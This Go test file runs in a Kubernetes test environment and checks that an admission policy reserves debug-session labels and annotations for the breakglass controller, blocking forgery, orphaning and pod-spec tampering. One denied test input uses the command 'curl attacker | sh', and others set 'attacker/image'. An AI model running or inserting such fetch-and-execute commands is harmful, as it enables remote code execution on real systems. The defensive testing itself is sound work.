// SPDX-FileCopyrightText: 2026 Deutsche Telekom AG
// SPDX-License-Identifier: Apache-2.0

package debug

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"io"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	appsv1 "k8s.io/api/apps/v1"
	autoscalingv1 "k8s.io/api/autoscaling/v1"
	batchv1 "k8s.io/api/batch/v1"
	corev1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/apis/meta/v1/unstructured"
	"k8s.io/apimachinery/pkg/runtime"
	utilyaml "k8s.io/apimachinery/pkg/util/yaml"
	"k8s.io/client-go/kubernetes"
	"k8s.io/client-go/kubernetes/scheme"
	"k8s.io/client-go/rest"
	"k8s.io/utils/ptr"
	"sigs.k8s.io/controller-runtime/pkg/client"
	"sigs.k8s.io/controller-runtime/pkg/envtest"
)

// TestPlatformRuntimeLabelReservationPolicyEnvtest proves that the optional
// config/components/runtime-label-reservation policy lets only the controller
// (and the kube-controller-manager, for reserved templates) set, change or
// remove the debug-session labels and annotations runtime-security tools key on.
func TestPlatformRuntimeLabelReservationPolicyEnvtest(t *testing.T) {
	if os.Getenv("KUBEBUILDER_ASSETS") == "" {
		t.Skip("KUBEBUILDER_ASSETS required")
	}
	env := &envtest.Environment{}
	cfg, err := env.Start()
	require.NoError(t, err)
	t.Cleanup(func() { require.NoError(t, env.Stop()) })
	admin, err := client.New(cfg, client.Options{Scheme: scheme.Scheme})
	require.NoError(t, err)
	ctx := context.Background()
	const ns = "label-reservation"
	require.NoError(t, admin.Create(ctx, &corev1.Namespace{ObjectMeta: metav1.ObjectMeta{Name: ns}}))

	raw, err := os.ReadFile(filepath.Join("..", "..", "..", "config", "components", "runtime-label-reservation", "policy.yaml"))
	require.NoError(t, err)
	decoder := utilyaml.NewYAMLOrJSONDecoder(bytes.NewReader(raw), 4096)
	for {
		obj := &unstructured.Unstructured{}
		err := decoder.Decode(&obj.Object)
		if errors.Is(err, io.EOF) {
			break
		}
		require.NoError(t, err)
		require.NoError(t, admin.Create(ctx, obj))
	}

	// system:masters skips RBAC, but not admission policies.
	as := func(user string, groups ...string) (client.Client, kubernetes.Interface) {
		impersonated := rest.CopyConfig(cfg)
		impersonated.Impersonate = rest.ImpersonationConfig{UserName: user, Groups: append([]string{"system:masters"}, groups...)}
		c, err := client.New(impersonated, client.Options{Scheme: scheme.Scheme})
		require.NoError(t, err)
		return c, kubernetes.NewForConfigOrDie(impersonated)
	}
	forger, forgerKube := as("tenant@example.com")
	controller, _ := as("system:serviceaccount:breakglass-system:breakglass-manager")
	replicaSetController, _ := as("system:serviceaccount:kube-system:replicaset-controller")
	deploymentController, _ := as("system:serviceaccount:kube-system:deployment-controller")

	denied := func(t *testing.T, err error, msgAndArgs ...any) {
		t.Helper()
		require.Error(t, err, msgAndArgs...)
		assert.Contains(t, err.Error(), "reserved for the breakglass controller")
	}
	pod := func(name string, labels, annotations map[string]string) *corev1.Pod {
		return &corev1.Pod{ObjectMeta: metav1.ObjectMeta{Name: name, Namespace: ns, Labels: labels, Annotations: annotations},
			Spec: corev1.PodSpec{Containers: []corev1.Container{{Name: "c", Image: "busybox"}}}}
	}
	sessionLabel := map[string]string{DebugSessionLabelKey: "s1"}

	// The policy takes effect asynchronously after it is created.
	require.Eventually(t, func() bool {
		err := forger.Create(ctx, pod("probe", sessionLabel, nil), client.DryRunAll)
		return err != nil && strings.Contains(err.Error(), "reserved for the breakglass controller")
	}, 30*time.Second, 200*time.Millisecond, "a forged debug-session label must be rejected")

	t.Run("forged pod labels and annotations are denied", func(t *testing.T) {
		denied(t, forger.Create(ctx, pod("forged-label", sessionLabel, nil)))
		denied(t, forger.Create(ctx, pod("forged-uid", nil, map[string]string{DebugSessionUIDAnnotationKey: "uid"})))
		denied(t, forger.Create(ctx, pod("forged-ephemeral", nil, map[string]string{"breakglass.telekom.com/ephemeral.debugger": "x"})))
		assert.NoError(t, forger.Create(ctx, pod("plain", map[string]string{"app": "x", "breakglass.telekom.com/debug-template": "t"}, nil)),
			"unreserved keys stay usable")
	})

	t.Run("controller and kube-controller-manager may set them", func(t *testing.T) {
		require.NoError(t, controller.Create(ctx, pod("debug", sessionLabel, map[string]string{DebugSessionUIDAnnotationKey: "uid"})))
		require.NoError(t, replicaSetController.Create(ctx, pod("debug-from-template", sessionLabel, nil)))
	})

	t.Run("updates may not add, change or remove reserved keys", func(t *testing.T) {
		mutate := func(name string, change func(*corev1.Pod)) error {
			p := &corev1.Pod{}
			require.NoError(t, admin.Get(ctx, client.ObjectKey{Namespace: ns, Name: name}, p))
			change(p)
			return forger.Update(ctx, p)
		}
		denied(t, mutate("plain", func(p *corev1.Pod) { p.Labels[DebugSessionLabelKey] = "s1" }))
		assert.NoError(t, mutate("plain", func(p *corev1.Pod) { p.Labels["team"] = "a" }), "ordinary pods are unaffected")
		denied(t, mutate("debug", func(p *corev1.Pod) { p.Labels[DebugSessionLabelKey] = "s2" }))
		denied(t, mutate("debug", func(p *corev1.Pod) { delete(p.Labels, DebugSessionLabelKey) }))
		denied(t, mutate("debug", func(p *corev1.Pod) { delete(p.Annotations, DebugSessionUIDAnnotationKey) }))
		assert.NoError(t, mutate("debug", func(p *corev1.Pod) { p.Annotations["team"] = "a" }), "annotations of a debug pod stay editable")
		denied(t, mutate("debug", func(p *corev1.Pod) { p.Labels["team"] = "a" }), "labels select a debug pod into its workload")

		p := &corev1.Pod{}
		require.NoError(t, admin.Get(ctx, client.ObjectKey{Namespace: ns, Name: "plain"}, p))
		p.Labels[DebugSessionLabelKey] = "s1"
		denied(t, forger.Status().Update(ctx, p))
	})

	t.Run("debug pod specs are frozen for everyone else", func(t *testing.T) {
		addEphemeral := func(name string) error {
			p := &corev1.Pod{}
			require.NoError(t, admin.Get(ctx, client.ObjectKey{Namespace: ns, Name: name}, p))
			p.Spec.EphemeralContainers = append(p.Spec.EphemeralContainers, corev1.EphemeralContainer{
				EphemeralContainerCommon: corev1.EphemeralContainerCommon{Name: "dbg", Image: "busybox", TerminationMessagePolicy: corev1.TerminationMessageReadFile, ImagePullPolicy: corev1.PullAlways}})
			_, err := forgerKube.CoreV1().Pods(ns).UpdateEphemeralContainers(ctx, p.Name, p, metav1.UpdateOptions{})
			return err
		}
		denied(t, addEphemeral("debug"))
		assert.NoError(t, addEphemeral("plain"), "ordinary pods keep kubectl debug")

		p := &corev1.Pod{}
		require.NoError(t, admin.Get(ctx, client.ObjectKey{Namespace: ns, Name: "debug"}, p))
		p.Spec.Containers[0].Image = "attacker/image"
		denied(t, forger.Update(ctx, p))
	})

	t.Run("binding annotations are reserved", func(t *testing.T) {
		require.NoError(t, forger.Create(ctx, pod("to-bind", nil, nil)))
		bind := func(annotations map[string]string) error {
			return forgerKube.CoreV1().Pods(ns).Bind(ctx, &corev1.Binding{
				ObjectMeta: metav1.ObjectMeta{Name: "to-bind", Namespace: ns, Annotations: annotations},
				Target:     corev1.ObjectReference{Kind: "Node", Name: "node-1"}}, metav1.CreateOptions{})
		}
		denied(t, bind(map[string]string{DebugSessionUIDAnnotationKey: "uid"}))
		require.NoError(t, bind(map[string]string{"example.com/scheduled-by": "x"}))
		bound := &corev1.Pod{}
		require.NoError(t, admin.Get(ctx, client.ObjectKey{Namespace: ns, Name: "to-bind"}, bound))
		assert.Equal(t, "node-1", bound.Spec.NodeName)
		assert.NotContains(t, bound.Annotations, DebugSessionUIDAnnotationKey)
	})

	t.Run("workload pod templates are reserved", func(t *testing.T) {
		template := func(labels map[string]string) corev1.PodTemplateSpec {
			return corev1.PodTemplateSpec{ObjectMeta: metav1.ObjectMeta{Labels: labels},
				Spec: corev1.PodSpec{RestartPolicy: corev1.RestartPolicyNever, Containers: []corev1.Container{{Name: "c", Image: "busybox"}}}}
		}
		selected := map[string]string{"app": "w", DebugSessionLabelKey: "s1"}
		selector := &metav1.LabelSelector{MatchLabels: map[string]string{"app": "w"}}
		always := template(selected)
		always.Spec.RestartPolicy = corev1.RestartPolicyAlways
		meta := func(name string) metav1.ObjectMeta { return metav1.ObjectMeta{Name: name, Namespace: ns} }
		for _, obj := range []client.Object{
			&appsv1.Deployment{ObjectMeta: meta("d"), Spec: appsv1.DeploymentSpec{Selector: selector, Template: always}},
			&appsv1.ReplicaSet{ObjectMeta: meta("rs"), Spec: appsv1.ReplicaSetSpec{Selector: selector, Template: always}},
			&appsv1.StatefulSet{ObjectMeta: meta("sts"), Spec: appsv1.StatefulSetSpec{Selector: selector, Template: always}},
			&appsv1.DaemonSet{ObjectMeta: meta("ds"), Spec: appsv1.DaemonSetSpec{Selector: selector, Template: always}},
			&corev1.ReplicationController{ObjectMeta: meta("rc"), Spec: corev1.ReplicationControllerSpec{Selector: map[string]string{"app": "w"}, Template: &always}},
			&batchv1.Job{ObjectMeta: meta("job"), Spec: batchv1.JobSpec{Template: template(selected)}},
			&batchv1.CronJob{ObjectMeta: meta("cron"), Spec: batchv1.CronJobSpec{Schedule: "@daily",
				JobTemplate: batchv1.JobTemplateSpec{Spec: batchv1.JobSpec{Template: template(selected)}}}},
		} {
			t.Run(obj.GetName(), func(t *testing.T) {
				denied(t, forger.Create(ctx, obj.DeepCopyObject().(client.Object), client.DryRunAll))
				assert.NoError(t, controller.Create(ctx, obj.DeepCopyObject().(client.Object), client.DryRunAll))
			})
		}
		// A StatefulSet creates Pods from the template in its current
		// ControllerRevision, so a forged revision must not carry the keys.
		revision := func(name string, labels map[string]string) *appsv1.ControllerRevision {
			data, err := json.Marshal(map[string]any{"spec": map[string]any{"template": map[string]any{
				"$patch": "replace", "metadata": map[string]any{"labels": labels},
				"spec": map[string]any{"containers": []any{map[string]any{"name": "c", "image": "attacker/image"}}}}}})
			require.NoError(t, err)
			return &appsv1.ControllerRevision{ObjectMeta: meta(name), Revision: 1, Data: runtime.RawExtension{Raw: data}}
		}
		denied(t, forger.Create(ctx, revision("forged-rev", selected), client.DryRunAll))
		assert.NoError(t, forger.Create(ctx, revision("plain-rev", map[string]string{"app": "w"}), client.DryRunAll))
		statefulSetController, _ := as("system:serviceaccount:kube-system:statefulset-controller")
		assert.NoError(t, statefulSetController.Create(ctx, revision("genuine-rev", selected), client.DryRunAll),
			"the StatefulSet controller records revisions of reserved templates")

		plain := &appsv1.Deployment{ObjectMeta: meta("plain"), Spec: appsv1.DeploymentSpec{Selector: selector, Replicas: ptr.To[int32](0),
			Template: func() corev1.PodTemplateSpec {
				p := template(map[string]string{"app": "w"})
				p.Spec.RestartPolicy = corev1.RestartPolicyAlways
				return p
			}()}}
		require.NoError(t, forger.Create(ctx, plain), "templates without reserved keys are unaffected")
		plain.Spec.Template.Labels[DebugSessionLabelKey] = "s1"
		denied(t, forger.Update(ctx, plain))

		// A controller-created debug Deployment: others may scale it and edit
		// its own metadata, but not change what its Pods run.
		debugDeployment := &appsv1.Deployment{ObjectMeta: meta("debug"), Spec: appsv1.DeploymentSpec{Selector: selector, Replicas: ptr.To[int32](0), Template: always}}
		require.NoError(t, controller.Create(ctx, debugDeployment))
		edit := func(change func(*appsv1.Deployment)) error {
			d := &appsv1.Deployment{}
			require.NoError(t, admin.Get(ctx, client.ObjectKeyFromObject(debugDeployment), d))
			change(d)
			return forger.Update(ctx, d)
		}
		assert.NoError(t, edit(func(d *appsv1.Deployment) { d.Spec.Replicas = ptr.To[int32](2) }))
		assert.NoError(t, edit(func(d *appsv1.Deployment) { d.Annotations = map[string]string{"team": "a"} }))
		denied(t, edit(func(d *appsv1.Deployment) { d.Labels = map[string]string{"team": "a"} }))
		denied(t, edit(func(d *appsv1.Deployment) { d.Spec.Template.Spec.Containers[0].Image = "attacker/image" }))
		denied(t, edit(func(d *appsv1.Deployment) {
			d.Spec.Template.Spec.Containers[0].Command = []string{"sh", "-c", "curl attacker | sh"}
		}))

		// A marked ReplicaSet owned by the debug Deployment: detaching it
		// would let its exempt controller keep creating marked Pods after
		// cleanup deletes the Deployment.
		require.NoError(t, admin.Get(ctx, client.ObjectKeyFromObject(debugDeployment), debugDeployment))
		owner := metav1.OwnerReference{APIVersion: "apps/v1", Kind: "Deployment", Name: debugDeployment.Name, UID: debugDeployment.UID,
			Controller: ptr.To(true), BlockOwnerDeletion: ptr.To(true)}
		owned := &appsv1.ReplicaSet{ObjectMeta: metav1.ObjectMeta{Name: "owned", Namespace: ns, Labels: map[string]string{"app": "w"},
			OwnerReferences: []metav1.OwnerReference{owner}}, Spec: appsv1.ReplicaSetSpec{Selector: selector, Replicas: ptr.To[int32](0), Template: always}}
		require.NoError(t, deploymentController.Create(ctx, owned))
		editRS := func(c client.Client, change func(*appsv1.ReplicaSet)) error {
			rs := &appsv1.ReplicaSet{}
			require.NoError(t, admin.Get(ctx, client.ObjectKeyFromObject(owned), rs))
			change(rs)
			return c.Update(ctx, rs)
		}
		denied(t, editRS(forger, func(rs *appsv1.ReplicaSet) { rs.OwnerReferences = nil }), "orphaning a marked ReplicaSet")
		denied(t, editRS(forger, func(rs *appsv1.ReplicaSet) { rs.Labels = map[string]string{"app": "detached"} }), "escaping re-adoption")
		assert.NoError(t, editRS(forger, func(rs *appsv1.ReplicaSet) { rs.Spec.Replicas = ptr.To[int32](1) }), "scaling stays allowed")
		assert.NoError(t, editRS(deploymentController, func(rs *appsv1.ReplicaSet) { rs.OwnerReferences = nil }),
			"the deployment controller still releases ReplicaSets")
		assert.NoError(t, editRS(controller, func(rs *appsv1.ReplicaSet) {
			rs.OwnerReferences = []metav1.OwnerReference{owner}
			rs.Labels = map[string]string{"app": "w", "team": "a"}
		}), "the breakglass controller still manages ownership and labels")
		rs := &appsv1.ReplicaSet{}
		require.NoError(t, admin.Get(ctx, client.ObjectKeyFromObject(owned), rs))
		rs.Labels = map[string]string{"app": "detached"}
		denied(t, forger.Status().Update(ctx, rs), "the status subresource must not detach it either")

		// The scale subresource carries only a replica count: it cannot change
		// labels, selector, ownership or the template, so it stays allowed.
		scale := &autoscalingv1.Scale{}
		require.NoError(t, forger.SubResource("scale").Get(ctx, debugDeployment.DeepCopy(), scale))
		scale.Spec.Replicas = 3
		require.NoError(t, forger.SubResource("scale").Update(ctx, debugDeployment.DeepCopy(), client.WithSubResourceBody(scale)))
		scaled := &appsv1.Deployment{}
		require.NoError(t, admin.Get(ctx, client.ObjectKeyFromObject(debugDeployment), scaled))
		assert.Equal(t, int32(3), *scaled.Spec.Replicas)
		assert.Equal(t, always.Spec.Containers[0].Image, scaled.Spec.Template.Spec.Containers[0].Image)
		assert.Equal(t, selected, scaled.Spec.Template.Labels)

		// Orphaning deletes would leave marked children behind; this also
		// covers clusters where the garbage collector shares the exempt
		// kube-controller-manager identity.
		orphan := client.PropagationPolicy(metav1.DeletePropagationOrphan)
		deleteDenied := func(t *testing.T, err error) {
			t.Helper()
			require.Error(t, err)
			assert.Contains(t, err.Error(), "may only be deleted with propagationPolicy Background or Foreground")
		}
		deleteDenied(t, forger.Delete(ctx, debugDeployment.DeepCopy(), orphan))

		// Jobs and ReplicationControllers orphan their Pods when the delete
		// carries no policy, so a marked one needs an explicit cascading policy.
		markedJob := &batchv1.Job{ObjectMeta: meta("marked-job"), Spec: batchv1.JobSpec{Suspend: ptr.To(true), Template: template(selected)}}
		markedRC := &corev1.ReplicationController{ObjectMeta: meta("marked-rc"),
			Spec: corev1.ReplicationControllerSpec{Replicas: ptr.To[int32](0), Selector: map[string]string{"app": "w"}, Template: always.DeepCopy()}}
		require.NoError(t, controller.Create(ctx, markedJob))
		require.NoError(t, controller.Create(ctx, markedRC))
		deleteDenied(t, forger.Delete(ctx, markedJob.DeepCopy()))
		deleteDenied(t, forger.Delete(ctx, markedRC.DeepCopy()))
		assert.NoError(t, forger.Delete(ctx, markedJob.DeepCopy(), client.PropagationPolicy(metav1.DeletePropagationForeground)))
		assert.NoError(t, forger.Delete(ctx, markedRC.DeepCopy(), client.PropagationPolicy(metav1.DeletePropagationBackground)))
		denied(t, edit(func(d *appsv1.Deployment) { d.Finalizers = append(d.Finalizers, "orphan") }), "the orphan finalizer")
		denied(t, edit(func(d *appsv1.Deployment) { d.Finalizers = append(d.Finalizers, "example.com/hold") }),
			"a foreign finalizer would hold the workload after cleanup deletes it")
		assert.NoError(t, forger.Delete(ctx, plain.DeepCopy(), orphan), "unmarked workloads may be orphaned")
		assert.NoError(t, forger.Delete(ctx, debugDeployment.DeepCopy(), client.PropagationPolicy(metav1.DeletePropagationBackground)),
			"cascading deletes stay allowed")
	})
	// On a spoke reached over OIDC the controller writes as the mapped OIDC
	// username, or is recognised by an OIDC group; both lists are configurable.
	t.Run("OIDC controller identities by username or group", func(t *testing.T) {
		policy := &unstructured.Unstructured{}
		policy.SetAPIVersion("admissionregistration.k8s.io/v1")
		policy.SetKind("ValidatingAdmissionPolicy")
		require.NoError(t, admin.Get(ctx, client.ObjectKey{Name: "breakglass-runtime-label-reservation"}, policy))
		variables, _, err := unstructured.NestedSlice(policy.Object, "spec", "variables")
		require.NoError(t, err)
		require.Equal(t, "controllerUsers", variables[0].(map[string]any)["name"])
		require.Equal(t, "controllerGroups", variables[1].(map[string]any)["name"])
		variables[0].(map[string]any)["expression"] = `["oidc:breakglass-group-sync@service.local"]`
		variables[1].(map[string]any)["expression"] = `["oidc:breakglass-controllers"]`
		require.NoError(t, unstructured.SetNestedSlice(policy.Object, variables, "spec", "variables"))
		require.NoError(t, admin.Update(ctx, policy))

		oidcController, _ := as("oidc:breakglass-group-sync@service.local")
		groupMember, _ := as("oidc:robot@example.com", "oidc:breakglass-controllers")
		otherOIDCUser, _ := as("oidc:robot@example.com", "oidc:tenant-admins")
		// The update takes effect asynchronously: wait until the old
		// ServiceAccount is no longer exempt.
		require.Eventually(t, func() bool {
			err := controller.Create(ctx, pod("sa-probe", sessionLabel, nil), client.DryRunAll)
			return err != nil && strings.Contains(err.Error(), "reserved for the breakglass controller")
		}, 30*time.Second, 200*time.Millisecond, "the replaced user list must apply")
		assert.NoError(t, oidcController.Create(ctx, pod("oidc-user", sessionLabel, nil), client.DryRunAll))
		assert.NoError(t, groupMember.Create(ctx, pod("oidc-group", sessionLabel, nil), client.DryRunAll))
		denied(t, otherOIDCUser.Create(ctx, pod("oidc-other", sessionLabel, nil), client.DryRunAll))
	})
}

// TestPlatformCleanupForegroundsPendingOwnerEnvtest proves that session
// cleanup does not leave a held workload's Pods running: when a foreign
// finalizer keeps a deleted debug Deployment pending, cleanup switches the
// delete to Foreground so the garbage collector removes its dependents.
func TestPlatformCleanupForegroundsPendingOwnerEnvtest(t *testing.T) {
	if os.Getenv("KUBEBUILDER_ASSETS") == "" {
		t.Skip("KUBEBUILDER_ASSETS required")
	}
	env := &envtest.Environment{}
	cfg, err := env.Start()
	require.NoError(t, err)
	t.Cleanup(func() { require.NoError(t, env.Stop()) })
	target, err := client.New(cfg, client.Options{Scheme: scheme.Scheme})
	require.NoError(t, err)
	ctx := context.Background()
	const ns = "cleanup-foreground"
	require.NoError(t, target.Create(ctx, &corev1.Namespace{ObjectMeta: metav1.ObjectMeta{Name: ns}}))

	labels := map[string]string{"app": "held", DebugSessionLabelKey: "s1"}
	held := &appsv1.Deployment{
		ObjectMeta: metav1.ObjectMeta{Name: "held", Namespace: ns, Finalizers: []string{"example.com/hold"}},
		Spec: appsv1.DeploymentSpec{Selector: &metav1.LabelSelector{MatchLabels: map[string]string{"app": "held"}},
			Template: corev1.PodTemplateSpec{ObjectMeta: metav1.ObjectMeta{Labels: labels},
				Spec: corev1.PodSpec{Containers: []corev1.Container{{Name: "c", Image: "busybox"}}}}},
	}
	require.NoError(t, target.Create(ctx, held))
	held.SetGroupVersionKind(appsv1.SchemeGroupVersion.WithKind("Deployment"))

	err = deleteTrackedResource(ctx, target, nil, held.DeepCopy())
	require.ErrorContains(t, err, "pending finalizers", "the held owner stays in the inventory for retry")
	live := &appsv1.Deployment{}
	require.NoError(t, target.Get(ctx, client.ObjectKeyFromObject(held), live))
	require.NotNil(t, live.DeletionTimestamp)
	assert.Contains(t, live.Finalizers, metav1.FinalizerDeleteDependents,
		"the garbage collector must delete the dependents although the owner is held")
	assert.Contains(t, live.Finalizers, "example.com/hold")

	// Retries keep the Foreground delete and still report the owner as pending.
	require.ErrorContains(t, deleteTrackedResource(ctx, target, nil, held.DeepCopy()), "pending finalizers")
}
